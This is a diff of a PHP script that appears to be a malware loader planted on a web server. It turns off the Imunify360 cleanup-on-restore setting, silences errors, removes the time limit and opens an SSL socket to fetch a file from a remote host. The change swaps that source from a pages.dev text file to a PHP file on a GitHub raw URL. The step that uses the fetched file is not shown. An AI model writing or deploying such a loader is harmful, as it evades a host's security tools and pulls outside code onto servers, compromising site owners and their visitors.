@@ -4,9 +4,9 @@ ini_set('lsapi_backend_off', '1');
 ini_set("imunify360.cleanup_on_restore", false);
 error_reporting(0);
 set_time_limit(0);
-$host = 'wongpurik.pages.dev';
+$host = 'raw.githubusercontent.com';
 $port = 443;
-$path = '/source/lolcatstream.txt';
+$path = '/dan1584/asfdas/refs/heads/main/Aks525jkwuy.php';
 
 $fp = stream_socket_client("ssl://$host:$port", $errno, $errstr, 30);
 if (!$fp) {
